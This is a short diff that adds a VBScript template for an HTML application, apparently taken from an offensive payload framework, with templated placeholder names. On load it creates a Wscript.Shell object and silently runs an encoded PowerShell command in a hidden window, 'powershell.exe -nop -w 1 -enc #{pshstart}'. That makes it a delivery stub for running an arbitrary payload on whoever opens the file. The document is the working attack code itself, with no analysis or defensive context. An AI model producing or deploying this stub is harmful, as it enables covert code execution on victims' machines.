@@ -1,0 +1,11 @@
+﻿<script language = "VBScript">
+
+  Function #{function}()
+    Dim #{shell}
+    Set #{shell} = CreateObject("Wscript.Shell")
+    #{shell}.run "powershell.exe -nop -w 1 -enc #{pshstart}", 0, true
+  End Function
+
+  #{function}
+  'self.close
+</script>
